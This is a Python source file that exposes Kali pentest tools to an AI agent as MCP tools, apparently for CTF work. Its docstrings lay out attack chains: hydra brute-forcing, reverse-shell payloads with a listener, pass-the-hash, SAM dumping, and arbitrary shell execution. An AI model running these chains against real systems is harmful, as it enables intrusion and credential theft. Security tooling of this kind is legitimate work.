"""
client/tools.py
───────────────
Register all @mcp.tool handlers on a FastMCP instance.

Each tool:
  1. Receives typed parameters from the AI agent
  2. Packages them into a dict
  3. POSTs to the Flask server → Flask runs the real binary → returns JSON
  4. Returns that JSON back to the agent

Import and call register_tools(mcp, kali_client) from client.py.
"""

from typing import Any, Dict

from mcp.server.fastmcp import FastMCP

from client.http_client import KaliToolsClient


def register_tools(mcp: FastMCP, kali_client: KaliToolsClient) -> None:

    @mcp.tool(name="nmap_scan")
    def nmap_scan(
        target: str,
        scan_type: str = "-sV",
        ports: str = "",
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        Run an Nmap scan against a target.

        Args:
            target:          IP address or hostname to scan
            scan_type:       Nmap flags e.g. -sV, -sCV, -A
            ports:           Ports or ranges e.g. "80,443" or "1-1000"
            additional_args: Extra Nmap flags e.g. "-T4 -Pn"
        """
        return kali_client.safe_post("api/tools/nmap", {
            "target": target,
            "scan_type": scan_type,
            "ports": ports,
            "additional_args": additional_args,
        })

    @mcp.tool(name="gobuster_scan")
    def gobuster_scan(
        url: str,
        mode: str = "dir",
        wordlist: str = "/usr/share/wordlists/dirb/common.txt",
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        Run Gobuster to brute-force directories, DNS subdomains, or vhosts.

        Args:
            url:             Target URL
            mode:            dir | dns | fuzz | vhost
            wordlist:        Full path to wordlist on the Kali server
            additional_args: Extra Gobuster flags
        """
        return kali_client.safe_post("api/tools/gobuster", {
            "url": url,
            "mode": mode,
            "wordlist": wordlist,
            "additional_args": additional_args,
        })

    @mcp.tool(name="dirb_scan")
    def dirb_scan(
        url: str,
        wordlist: str = "/usr/share/wordlists/dirb/common.txt",
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        Run Dirb web content scanner.

        Args:
            url:             Target URL
            wordlist:        Full path to wordlist on the Kali server
            additional_args: Extra Dirb flags
        """
        return kali_client.safe_post("api/tools/dirb", {
            "url": url,
            "wordlist": wordlist,
            "additional_args": additional_args,
        })

    @mcp.tool(name="nikto_scan")
    def nikto_scan(target: str, additional_args: str = "") -> Dict[str, Any]:
        """
        Run Nikto web server vulnerability scanner.

        Args:
            target:          Target URL or IP
            additional_args: Extra Nikto flags
        """
        return kali_client.safe_post("api/tools/nikto", {
            "target": target,
            "additional_args": additional_args,
        })

    @mcp.tool(name="sqlmap_scan")
    def sqlmap_scan(url: str, data: str = "", additional_args: str = "") -> Dict[str, Any]:
        """
        Run SQLmap SQL injection scanner.

        Args:
            url:             Target URL
            data:            POST body string (for POST-based injection)
            additional_args: Extra SQLmap flags
        """
        return kali_client.safe_post("api/tools/sqlmap", {
            "url": url,
            "data": data,
            "additional_args": additional_args,
        })

    @mcp.tool(name="metasploit_run")
    def metasploit_run(module: str, options: Dict[str, Any] = {}) -> Dict[str, Any]:
        """
        Execute a Metasploit module.

        Args:
            module:  Module path e.g. exploit/multi/handler
            options: Dict of SET options e.g. {"LHOST": "10.0.0.1", "LPORT": 4444}
        """
        return kali_client.safe_post("api/tools/metasploit", {
            "module": module,
            "options": options,
        })

    @mcp.tool(name="hydra_attack")
    def hydra_attack(
        target: str,
        service: str,
        username: str = "",
        username_file: str = "",
        password: str = "",
        password_file: str = "",
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        Run Hydra password brute-force attack.

        Args:
            target:          Target IP or hostname
            service:         Service protocol e.g. ssh, ftp, http-post-form
            username:        Single username
            username_file:   Path to username wordlist
            password:        Single password
            password_file:   Path to password wordlist
            additional_args: Extra Hydra flags
        """
        return kali_client.safe_post("api/tools/hydra", {
            "target": target,
            "service": service,
            "username": username,
            "username_file": username_file,
            "password": password,
            "password_file": password_file,
            "additional_args": additional_args,
        })

    @mcp.tool(name="john_crack")
    def john_crack(
        hash_file: str,
        wordlist: str = "/usr/share/wordlists/rockyou.txt",
        format_type: str = "",
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        Run John the Ripper hash cracker.

        Args:
            hash_file:       Path to file containing hashes on the Kali server
            wordlist:        Path to wordlist
            format_type:     Hash format e.g. md5crypt, sha512crypt, ntlm
            additional_args: Extra John flags
        """
        return kali_client.safe_post("api/tools/john", {
            "hash_file": hash_file,
            "wordlist": wordlist,
            "format": format_type,
            "additional_args": additional_args,
        })

    @mcp.tool(name="wpscan_analyze")
    def wpscan_analyze(url: str, additional_args: str = "") -> Dict[str, Any]:
        """
        Run WPScan WordPress vulnerability scanner.

        Args:
            url:             Target WordPress URL
            additional_args: Extra WPScan flags e.g. --enumerate u
        """
        return kali_client.safe_post("api/tools/wpscan", {
            "url": url,
            "additional_args": additional_args,
        })

    @mcp.tool(name="enum4linux_scan")
    def enum4linux_scan(target: str, additional_args: str = "-a") -> Dict[str, Any]:
        """
        Run Enum4linux Windows/Samba enumeration.

        Args:
            target:          Target IP or hostname
            additional_args: Flags — default -a runs all checks
        """
        return kali_client.safe_post("api/tools/enum4linux", {
            "target": target,
            "additional_args": additional_args,
        })

    @mcp.tool(name="execute_command")
    def run_command(command: str) -> Dict[str, Any]:
        """
        Execute any arbitrary shell command on the Kali server.

        Use this for tools not covered by the dedicated endpoints above.

        Args:
            command: Full shell command string e.g. "whois 10.10.10.1"
        """
        return kali_client.execute_command(command)

    @mcp.tool(name="server_health")
    def server_health() -> Dict[str, Any]:
        """
        Check the health of the Kali API server and which tools are installed.

        Returns a dict with tool availability status — useful before starting
        a pentest workflow to confirm the required tools are present.
        """
        return kali_client.check_health()

    # -----------------------------------------------------------------------
    # Tshark — live capture
    # -----------------------------------------------------------------------
    @mcp.tool(name="tshark_capture")
    def tshark_capture(
        interface: str = "eth0",
        capture_filter: str = "",
        duration: str = "10",
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        Capture and analyse live network traffic with tshark.
        Use for: sniffing credentials, inspecting HTTP, catching reverse shells.
        Run server_health first to confirm interface name.

        Args:
            interface:       Network interface e.g. eth0, tun0
            capture_filter:  BPF filter e.g. "port 80" or "host 10.10.11.5"
            duration:        Capture duration in seconds
            additional_args: Extra tshark flags e.g. "-Y http" for display filter
        """
        return kali_client.safe_post("api/tools/tshark", {
            "interface": interface,
            "capture_filter": capture_filter,
            "duration": duration,
            "additional_args": additional_args,
        })

    # -----------------------------------------------------------------------
    # Tshark — read pcap file
    # -----------------------------------------------------------------------
    @mcp.tool(name="tshark_read_pcap")
    def tshark_read_pcap(
        pcap_file: str,
        display_filter: str = "",
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        Read and analyse an existing .pcap or .pcapng file with tshark.
        Use for: analysing captured traffic, CTF pcap challenges,
        extracting credentials, finding flags hidden in packets.

        Args:
            pcap_file:       Full path to pcap file on Kali e.g. "/root/capture.pcap"
            display_filter:  Wireshark display filter e.g. "http" "ftp" "tcp.port==4444"
                             "frame contains password" "http.request.method==POST"
            additional_args: Extra tshark flags e.g. "-T fields -e http.file_data"
                             to extract specific field values
        """
        return kali_client.safe_post("api/tools/tshark/pcap", {
            "pcap_file": pcap_file,
            "display_filter": display_filter,
            "additional_args": additional_args,
        })

    # -----------------------------------------------------------------------
    # Tcpdump
    # -----------------------------------------------------------------------
    @mcp.tool(name="tcpdump_capture")
    def tcpdump_capture(
        interface: str = "eth0",
        capture_filter: str = "",
        packet_count: str = "50",
        additional_args: str = "-nn"
    ) -> Dict[str, Any]:
        """
        Lightweight packet capture with tcpdump.
        Use as a faster/simpler alternative to tshark for quick traffic checks.

        Args:
            interface:       Network interface e.g. eth0, tun0
            capture_filter:  BPF filter e.g. "tcp port 443"
            packet_count:    Stop after N packets
            additional_args: Extra flags — default -nn disables name resolution
        """
        return kali_client.safe_post("api/tools/tcpdump", {
            "interface": interface,
            "capture_filter": capture_filter,
            "packet_count": packet_count,
            "additional_args": additional_args,
        })

    # -----------------------------------------------------------------------
    # Netdiscover
    # -----------------------------------------------------------------------
    @mcp.tool(name="netdiscover_scan")
    def netdiscover_scan(
        target_range: str = "",
        interface: str = "",
        additional_args: str = "-P"
    ) -> Dict[str, Any]:
        """
        ARP host discovery with netdiscover — finds live hosts on a subnet.
        Use at the start of a LAN engagement before nmap.

        Args:
            target_range:    CIDR range e.g. "192.168.1.0/24"
            interface:       Network interface to use
            additional_args: -P = passive mode (no ARP broadcast)
        """
        return kali_client.safe_post("api/tools/netdiscover", {
            "target_range": target_range,
            "interface": interface,
            "additional_args": additional_args,
        })

    # -----------------------------------------------------------------------
    # Masscan
    # -----------------------------------------------------------------------
    @mcp.tool(name="masscan_scan")
    def masscan_scan(
        target: str,
        ports: str = "0-65535",
        rate: str = "1000",
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        Fast full-port scanner — much faster than nmap for large ranges.
        Use first to find open ports, then nmap_scan for service fingerprinting.

        Args:
            target:          IP, CIDR, or range e.g. "10.10.11.0/24"
            ports:           Port range — default is all 65535 ports
            rate:            Packets per second — keep under 10000 on VPN
            additional_args: Extra masscan flags
        """
        return kali_client.safe_post("api/tools/masscan", {
            "target": target,
            "ports": ports,
            "rate": rate,
            "additional_args": additional_args,
        })

    # -----------------------------------------------------------------------
    # WhatWeb
    # -----------------------------------------------------------------------
    @mcp.tool(name="whatweb_fingerprint")
    def whatweb_fingerprint(
        url: str,
        aggression: str = "1",
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        Web technology fingerprinter — identifies CMS, frameworks, server software.
        Use before nikto/gobuster to know what you're dealing with.

        Args:
            url:             Target URL
            aggression:      1=passive, 3=aggressive, 4=heavy
            additional_args: Extra whatweb flags
        """
        return kali_client.safe_post("api/tools/whatweb", {
            "url": url,
            "aggression": aggression,
            "additional_args": additional_args,
        })

    # -----------------------------------------------------------------------
    # SSH command execution  [PRIORITY 1 — closes the post-shell gap]
    # -----------------------------------------------------------------------
    @mcp.tool(name="ssh_command")
    def ssh_command(
        host: str,
        username: str,
        command: str,
        password: str = "",
        key_file: str = "",
        port: int = 22,
        timeout: int = 30
    ) -> Dict[str, Any]:
        """
        Run a command on a remote host over SSH and return the output.

        This closes the post-exploitation loop: hydra finds creds →
        ssh_command uses them → run linpeas → read privesc path → escalate.

        Args:
            host:     Target IP or hostname
            username: SSH username
            command:  Shell command to execute on the target
            password: SSH password (use with username)
            key_file: Path to private key on Kali e.g. "/root/.ssh/id_rsa"
            port:     SSH port (default 22)
            timeout:  Command timeout in seconds
        """
        return kali_client.safe_post("api/tools/ssh", {
            "host": host,
            "username": username,
            "command": command,
            "password": password,
            "key_file": key_file,
            "port": port,
            "timeout": timeout,
        })

    # -----------------------------------------------------------------------
    # Searchsploit  [PRIORITY 2]
    # -----------------------------------------------------------------------
    @mcp.tool(name="searchsploit")
    def searchsploit_search(
        query: str,
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        Search the Exploit-DB offline archive for exploits matching a query.
        Use immediately after nmap reveals a service version.

        Workflow: nmap finds "vsftpd 2.3.4" → searchsploit("vsftpd 2.3.4")
        → metasploit_run with the module path found.

        Args:
            query:           Search string e.g. "vsftpd 2.3.4" or "Apache 2.4.49"
            additional_args: Extra flags e.g. "--cve CVE-2021-41773" or "--id" to show EDB-IDs
        """
        return kali_client.safe_post("api/tools/searchsploit", {
            "query": query,
            "additional_args": additional_args,
        })

    # -----------------------------------------------------------------------
    # LinPEAS / WinPEAS  [PRIORITY 3]
    # -----------------------------------------------------------------------
    @mcp.tool(name="run_linpeas")
    def run_linpeas(
        host: str,
        username: str,
        password: str = "",
        key_file: str = "",
        port: int = 22,
        script_type: str = "linpeas",
        script_path: str = "",
        timeout: int = 300
    ) -> Dict[str, Any]:
        """
        Upload and execute LinPEAS or WinPEAS on a compromised host via SSH.
        Returns the full privilege escalation enumeration output.

        This automates the hardest part of CTFs — finding the privesc path.
        ANSI colour codes are stripped so the output is readable.

        Args:
            host:        Compromised host IP
            username:    SSH username on the target
            password:    SSH password
            key_file:    Path to private key on Kali (alternative to password)
            port:        SSH port (default 22)
            script_type: "linpeas" (Linux) or "winpeas" (Windows)
            script_path: Override path to PEAS script on Kali (auto-detected if empty)
            timeout:     Max seconds to wait for PEAS to finish (default 300)
        """
        return kali_client.safe_post("api/tools/linpeas", {
            "host": host,
            "username": username,
            "password": password,
            "key_file": key_file,
            "port": port,
            "script_type": script_type,
            "script_path": script_path,
            "timeout": timeout,
        })

    # -----------------------------------------------------------------------
    # HTTP request (curl)  [PRIORITY 4]
    # -----------------------------------------------------------------------
    @mcp.tool(name="http_request")
    def http_request(
        url: str,
        method: str = "GET",
        data: str = "",
        headers: Dict[str, str] = {},
        cookies: str = "",
        follow_redirect: bool = True,
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        Make an HTTP/HTTPS request with full curl flexibility.
        Use for: probing endpoints, testing auth, submitting forms,
        downloading files to Kali, interacting with APIs.

        Args:
            url:             Target URL
            method:          HTTP method GET | POST | PUT | DELETE | PATCH
            data:            Request body for POST/PUT
            headers:         Dict of headers e.g. {"Cookie": "session=abc"}
            cookies:         Cookie string e.g. "session=abc; token=xyz"
            follow_redirect: Follow 3xx redirects (default True)
            additional_args: Extra curl flags e.g. "-k" to skip TLS verification
                             or "-o /tmp/file.php" to save to disk
        """
        return kali_client.safe_post("api/tools/http_request", {
            "url": url,
            "method": method,
            "data": data,
            "headers": headers,
            "cookies": cookies,
            "follow_redirect": follow_redirect,
            "additional_args": additional_args,
        })

    # -----------------------------------------------------------------------
    # Msfvenom  [PRIORITY 5]
    # -----------------------------------------------------------------------
    @mcp.tool(name="msfvenom_generate")
    def msfvenom_generate(
        payload: str,
        lhost: str = "",
        lport: str = "4444",
        output_format: str = "elf",
        output_file: str = "",
        encoder: str = "",
        iterations: str = "",
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        Generate a payload with msfvenom for use with metasploit_run or standalone.

        Common payload workflow:
          msfvenom_generate(payload="linux/x64/shell_reverse_tcp", lhost="10.10.14.5",
                            lport="4444", output_file="/tmp/shell.elf")
          → http_request to deliver it  →  listener to catch the shell

        Args:
            payload:         Metasploit payload path e.g. "linux/x64/shell_reverse_tcp"
            lhost:           Attacker IP (your tun0 address)
            lport:           Listener port
            output_format:   elf | exe | php | py | rb | raw | asp | war | jar
            output_file:     Save to path on Kali e.g. "/tmp/shell.elf"
            encoder:         Encoder e.g. "x86/shikata_ga_nai"
            iterations:      Number of encoding iterations e.g. "5"
            additional_args: Extra msfvenom flags
        """
        return kali_client.safe_post("api/tools/msfvenom", {
            "payload": payload,
            "lhost": lhost,
            "lport": lport,
            "format": output_format,
            "output_file": output_file,
            "encoder": encoder,
            "iterations": iterations,
            "additional_args": additional_args,
        })

    # -----------------------------------------------------------------------
    # Hashcat  [PRIORITY 8 — GPU cracking]
    # -----------------------------------------------------------------------
    @mcp.tool(name="hashcat_crack")
    def hashcat_crack(
        hash_file: str,
        hash_type: str,
        wordlist: str = "/usr/share/wordlists/rockyou.txt",
        attack_mode: str = "0",
        rules: str = "",
        additional_args: str = "--force"
    ) -> Dict[str, Any]:
        """
        GPU-accelerated hash cracking with hashcat.
        Faster than john for most hash types — use when john is too slow.

        Common hash types:
          0    = MD5         1000  = NTLM       1800 = sha512crypt ($6$)
          500  = md5crypt    1400  = SHA-256     3200 = bcrypt
          1800 = sha512crypt 5600  = NetNTLMv2   13100 = Kerberoast

        Args:
            hash_file:   Path to file containing hash(es) on Kali
            hash_type:   Hashcat mode number (see above)
            wordlist:    Path to wordlist
            attack_mode: 0=dictionary, 3=brute-force, 6=hybrid wordlist+mask
            rules:       Rule file e.g. "/usr/share/hashcat/rules/best64.rule"
            additional_args: Extra hashcat flags — --force bypasses GPU warnings in VMs
        """
        return kali_client.safe_post("api/tools/hashcat", {
            "hash_file": hash_file,
            "hash_type": hash_type,
            "wordlist": wordlist,
            "attack_mode": attack_mode,
            "rules": rules,
            "additional_args": additional_args,
        })

    # -----------------------------------------------------------------------
    # Smbclient
    # -----------------------------------------------------------------------
    @mcp.tool(name="smbclient_interact")
    def smbclient_interact(
        target: str,
        share: str = "",
        username: str = "",
        password: str = "",
        smb_command: str = "ls",
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        Interact with SMB shares via smbclient.
        Use after enum4linux finds shares — this lets you actually read files.

        Workflow: enum4linux_scan finds share "Data" →
        smbclient_interact(target, share="Data", smb_command="ls") →
        smbclient_interact(..., smb_command="get passwords.txt /tmp/passwords.txt")

        Args:
            target:      Target IP or hostname
            share:       Share name e.g. "Data" (omit to list all shares)
            username:    SMB username (omit for anonymous)
            password:    SMB password
            smb_command: Command to run e.g. "ls" "get file.txt /tmp/file.txt" "recurse ON; ls"
            additional_args: Extra smbclient flags
        """
        return kali_client.safe_post("api/tools/smbclient", {
            "target": target,
            "share": share,
            "username": username,
            "password": password,
            "smb_command": smb_command,
            "additional_args": additional_args,
        })

    # -----------------------------------------------------------------------
    # Ffuf
    # -----------------------------------------------------------------------
    @mcp.tool(name="ffuf_fuzz")
    def ffuf_fuzz(
        url: str,
        wordlist: str = "/usr/share/wordlists/dirb/common.txt",
        fuzz_keyword: str = "FUZZ",
        method: str = "GET",
        data: str = "",
        headers: Dict[str, str] = {},
        filter_codes: str = "",
        match_codes: str = "",
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        Fast web fuzzer — better than gobuster for parameter and vhost fuzzing.
        Place FUZZ anywhere in the URL, headers, or body.

        Use cases:
          Directory fuzzing:   url="http://10.10.11.5/FUZZ"
          Parameter fuzzing:   url="http://10.10.11.5/page?id=FUZZ"
          Vhost fuzzing:       url="http://10.10.11.5/", headers={"Host": "FUZZ.target.htb"}
          POST body fuzzing:   method="POST", data="username=FUZZ&password=admin"

        Args:
            url:            Target URL — FUZZ keyword will be injected if missing
            wordlist:       Path to wordlist on Kali
            fuzz_keyword:   Placeholder to replace — default FUZZ
            method:         HTTP method
            data:           POST body (place FUZZ inside for body fuzzing)
            headers:        Custom headers dict
            filter_codes:   HTTP codes to hide e.g. "404,403"
            match_codes:    HTTP codes to show e.g. "200,301,302"
            additional_args: Extra ffuf flags e.g. "-fs 0" to filter empty responses
        """
        return kali_client.safe_post("api/tools/ffuf", {
            "url": url,
            "wordlist": wordlist,
            "fuzz_keyword": fuzz_keyword,
            "method": method,
            "data": data,
            "headers": headers,
            "filter_codes": filter_codes,
            "match_codes": match_codes,
            "additional_args": additional_args,
        })

    # -----------------------------------------------------------------------
    # CrackMapExec / NetExec
    # -----------------------------------------------------------------------
    @mcp.tool(name="crackmapexec")
    def crackmapexec_run(
        target: str,
        protocol: str = "smb",
        username: str = "",
        password: str = "",
        hash_value: str = "",
        domain: str = "",
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        SMB/AD Swiss army knife — crackmapexec (or nxc on newer Kali).
        Use for: credential spraying, pass-the-hash, share enumeration,
        checking local admin, executing commands across a domain.

        Common workflows:
          Check creds:         crackmapexec(target="10.10.11.0/24", username="admin", password="Password1")
          Pass-the-hash:       crackmapexec(target, username="admin", hash_value="aad3b435...:<ntlm>")
          List shares:         crackmapexec(target, username, password, additional_args="--shares")
          Execute command:     crackmapexec(target, username, password, additional_args="-x 'whoami'")
          Dump SAM:            crackmapexec(target, username, password, additional_args="--sam")

        Args:
            target:          IP, CIDR, or hostname
            protocol:        smb | winrm | ldap | rdp | mssql | ssh
            username:        Username or path to username list
            password:        Password or path to password list
            hash_value:      NT hash for pass-the-hash e.g. "aad3b435b51404eeaad3b435b51404ee:<ntlm>"
            domain:          Active Directory domain
            additional_args: Extra flags — see common workflows above
        """
        return kali_client.safe_post("api/tools/crackmapexec", {
            "protocol": protocol,
            "target": target,
            "username": username,
            "password": password,
            "hash": hash_value,
            "domain": domain,
            "additional_args": additional_args,
        })

    # -----------------------------------------------------------------------
    # Netcat listener
    # -----------------------------------------------------------------------
    @mcp.tool(name="start_listener")
    def start_listener(
        port: str,
        duration: str = "60",
        use_rlwrap: bool = False
    ) -> Dict[str, Any]:
        """
        Start a netcat listener to catch reverse shells.

        Pair with msfvenom_generate to complete the full payload delivery cycle:
          msfvenom_generate → deliver payload → start_listener → catch shell → ssh_command

        Note: The listener blocks until a connection is received or duration expires.
        Use duration to avoid hanging the agent indefinitely.

        Args:
            port:       Port to listen on e.g. "4444"
            duration:   Seconds to wait before giving up (default 60)
            use_rlwrap: Wrap with rlwrap for arrow-key history support
        """
        return kali_client.safe_post("api/tools/listener", {
            "port": port,
            "duration": duration,
            "use_rlwrap": use_rlwrap,
        })
